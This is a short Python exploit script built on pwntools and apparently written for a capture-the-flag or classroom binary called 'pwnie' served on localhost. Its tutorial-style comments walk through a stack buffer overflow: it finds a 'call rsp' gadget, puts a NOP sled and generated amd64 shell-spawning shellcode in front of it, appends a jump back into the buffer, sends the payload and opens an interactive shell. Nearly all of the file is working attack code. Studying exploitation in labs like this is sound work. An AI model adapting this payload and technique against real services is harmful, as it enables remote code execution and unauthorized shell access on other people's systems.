#!/usr/bin/python3

# import pwntools library
from pwn import *

# ---- loading the binary as an ELF (to reference file characteristics)

elf = ELF("./pwnie")
context.update(arch='x86_64',os='linux')

# ---- loading binary to pwntools ----

# (1) simple loading of binary
# Example:
#p = process(elf.path)
p = remote("localhost",8882)

# (2) simple loading of binary (with pwndbg launched)
# Example:
#p = gdb.debug(elf.path,'''
#break main
#continue
#''')

# ---- constructing the payload ---
# in addition to the usual workflow, you will also need these syntaxes:

## This variable below finds an address within the binary that points to the JMP RSP instruction.
CALL_RSP_ADDR = p64(next(elf.search(asm("call rsp"))))
JMP_TO_FRONT = asm("sub rsp, 616") + asm("jmp rsp")

#CALL_RSP_ADDR = p64(0x40115e)

## This variable generates the necessary shellcode (set of assembly instructions) to give you a shell
shellcode = asm(shellcraft.amd64.linux.sh())

# usual workflow:
# (1) let's flood the input with lots of 'A's
pl_sz = 616
payload = b'\x90'*8 + shellcode + b'\x90'*(pl_sz-8-len(shellcode)) + CALL_RSP_ADDR + JMP_TO_FRONT
#payload = pl_sz * b'\xcc'+ shellcode + b'\x90'*8  + CALL_RSP_ADDR + JMP_TO_FRONT
#
# (2) send it to the program
p.sendline(payload)
#
# (3) get an interactive interface (this is for later to get a shell, but we'll leave this last line for now)
p.interactive()

